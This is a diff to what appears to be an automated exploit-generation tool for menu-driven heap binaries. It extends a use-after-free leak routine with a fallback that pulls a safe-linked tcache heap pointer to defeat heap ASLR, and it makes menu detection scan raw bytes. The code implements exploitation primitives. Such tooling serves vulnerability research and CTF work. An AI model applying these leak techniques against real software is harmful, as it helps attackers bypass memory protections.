@@ -16,6 +16,7 @@ import tempfile
 from pathlib import Path
 
 from ...jobs.registry import register_stage
+from .. import invocation
 from ..dynamic import sandbox
 from ..fuzz import menu
 from ..poc import exploit
@@ -285,6 +286,7 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
     for p in range(8):
         fill += _c(free, idx=p)
     fill += _c(view, idx=7)
+    heap_fallback = None                                 # a leaked heap fd if no libc is reachable
     for writes, show_sz in ((big, 0x500), (fill, 0x80)):
         out = _drive(workdir, exe, writes, timeout=timeout)
         if not out:
@@ -293,6 +295,15 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
         if base:
             return {"kind": "libc", "base": base, "leaked": leaked, "dump": out[:400],
                     "size": show_sz}
+        # No libc pointer, but a freed chunk whose fd is a heap address (0x55/0x56 top byte -- a raw
+        # or safe-linked tcache fd) is still a DEMONSTRATED heap-ASLR defeat. On a modern glibc the
+        # Nth same-size free often stays in tcache (safe-linked fd) instead of spilling to the
+        # unsorted bin, so this is the common disclosure when a libc pointer is out of reach.
+        if heap_fallback is None:
+            hv = next((v for v in _leak._le_pointer_words(out) if (v >> 40) in (0x55, 0x56)), None)
+            if hv:
+                heap_fallback = {"kind": "heap", "base": hv, "leaked": hv, "dump": out[:400],
+                                 "size": show_sz}
     # Strategy 3 -- small single chunk: no libc reachable, but a tcache fd is still a heap-address
     # disclosure (defeats heap ASLR). Separate, so a stray 0x7f value never masquerades as libc.
     out = _drive(workdir, exe, _c(add, idx=0, size=0x18, data=b"P" * 8) + _c(add, idx=1, size=0x18)
@@ -303,7 +314,7 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
         if heapish:
             return {"kind": "heap", "base": heapish, "leaked": heapish, "dump": out[:400],
                     "size": 0x18}
-    return None
+    return heap_fallback
 
 
 def _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts, width, alloc):
@@ -421,7 +432,9 @@ def heap_trace_stage(ctx) -> dict:
     edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
     strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                if getattr(x, "value", None)]
-    opts = menu.detect_menu(strings)
+    # StringDAO is filled by the DISASSEMBLE stage; fall back to a direct byte scan so menu detection
+    # does not depend on stage ordering (the same reason _looks_like_heap_menu uses raw_strings).
+    opts = menu.detect_menu(strings) or menu.detect_menu(invocation.raw_strings(target_bytes))
     alloc = heaptrace.identify_allocator(functions, edges)
     # A stripped target has no named allocator; if it is a menu-driven heap service we fall back to
     # tracing libc malloc/free directly (resolved from the PLT below, once the binary is on disk).
